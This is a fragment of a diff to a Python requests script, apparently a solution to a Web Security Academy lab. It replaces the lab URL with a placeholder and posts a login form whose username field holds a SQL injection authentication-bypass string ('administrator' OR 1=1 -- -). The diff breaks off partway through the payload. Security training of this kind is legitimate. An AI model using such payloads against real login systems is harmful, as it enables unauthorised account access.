@@ -1,6 +1,6 @@
 import requests
 
-url = "https://0aa3008e04d009d080d7d5e400e800a6.web-security-academy.net/login"
+url = "https://YOUR_HOST/login"
 payload = {
     "csrf":"lzIW1Vd5zVYSvWTshDrJUbm0KLDiPO8v",
     "username":"administrator' OR 1=1 -- -",
